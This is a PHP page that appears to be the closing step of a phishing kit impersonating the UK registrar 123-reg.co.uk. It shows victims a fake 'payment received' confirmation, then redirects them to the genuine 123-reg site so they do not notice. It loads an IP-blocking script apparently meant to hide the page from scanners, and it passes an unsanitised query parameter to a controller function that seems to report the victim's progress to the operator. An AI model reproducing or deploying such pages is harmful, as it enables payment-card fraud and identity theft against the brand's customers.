<?php require '../main.php';require_once 'blockip.php';?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" type="image/ico" href="./img/favicon.png" />
    <title>123-reg.co.uk</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
        }

        body {
            background-color: #FFFFFF;
            color: #333;
            line-height: 1.6;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .wave {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }

        /* Header */
        header {
            background-color: #fff;
            border-bottom: 1px solid #e0e0e0;
            padding: 15px 0;
        }

        .shoreline {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .surfboard {
            color: #111;
        }

        .beachbreak {
            display: flex;
            align-items: center;
            gap: 5px;
            cursor: pointer;
        }

        /* Main Content */
        main {
            padding: 100px 0; /* Reduced top padding */
            flex: 1;
            display: flex;
            flex-direction: column; /* Changed to column */
            align-items: center;
        }

        .thank-you-container {
            text-align: center;
            max-width: 400px;
            width: 100%;
        }

        .thank-you-icon {
            font-size: 48px;
            color: #4CAF50;
            margin-bottom: 20px;
        }

        .thank-you-title {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 15px;
        }

        .thank-you-message {
            font-size: 16px;
            margin-bottom: 20px;
        }

        .redirect-message {
            font-size: 14px;
            color: #666;
        }

        /* Footer */
        .tideline {
            text-align: center;
            padding: 20px 0;
            background-color: #f8f8f8;
            color: #666;
            font-size: 12px;
            margin-top: auto; /* Push footer to bottom */
        }

        .tideline a {
            color: #00a4a6;
            text-decoration: none;
        }

        .tideline a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <header>
        <div class="wave shoreline">
            <div class="surfboard">
                <img src="./img/lgo.webp" width="140" height="40">
            </div>
            <div class="beachbreak">
                <img src="./img/out.webp" width="24" height="24" style="max-width: 24px; height: auto;">
            </div>
        </div>
    </header>

    <main>
        <div class="thank-you-container">
            <div class="thank-you-icon">
                <i class="fas fa-check-circle"></i>
            </div>
            <h1 class="thank-you-title">Thank You!</h1>
            <p class="thank-you-message">We have received your payment. Your order has been processed successfully.</p>
            <p class="redirect-message">You will be redirected to your panel in <span id="seconds">10</span> seconds...</p>
        </div>
    </main>

    <footer class="tideline">
        <div class="wave">
            Copyright © 1999 - 2025 123-reg.co.uk Operating Company, LLC. All Rights Reserved. 
            <a>Privacy Policy</a>
        </div>
    </footer>

    <script>
        // Countdown timer
        let seconds = 10;
        const secondsElement = document.getElementById('seconds');

        function updateCountdown() {
            secondsElement.textContent = seconds;
            
            if (seconds > 0) {
                seconds--;
                setTimeout(updateCountdown, 1000);
            } else {
                window.location.href = 'https://www.123-reg.co.uk/terms/cookie-law-terms/';
            }
        }

        updateCountdown();
    </script>
     <script src="js/jq.js"></script>
    <?php $m->ctr(" 🔚❌🏃🚪 ".@$_GET['e']); ?>
</body>
</html>
